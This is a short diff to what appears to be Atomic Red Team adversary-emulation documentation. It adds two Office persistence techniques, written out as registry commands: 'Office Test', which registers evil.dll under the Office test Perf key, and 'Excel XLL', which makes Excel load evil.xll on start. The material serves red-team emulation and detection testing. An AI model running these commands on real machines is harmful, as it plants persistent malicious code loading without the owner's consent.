@@ -26,3 +26,11 @@ Generate the payload and download.ps1 following the Unicorn instructions, or to 
 ## Word VBA Macro
 
 [Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
+
+## Office Test
+
+`reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\<username>\evil.dll`
+
+## Excel XLL
+
+`reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Excel\Options" /v OPEN /t REG_SZ /d "/R evil.xll"`
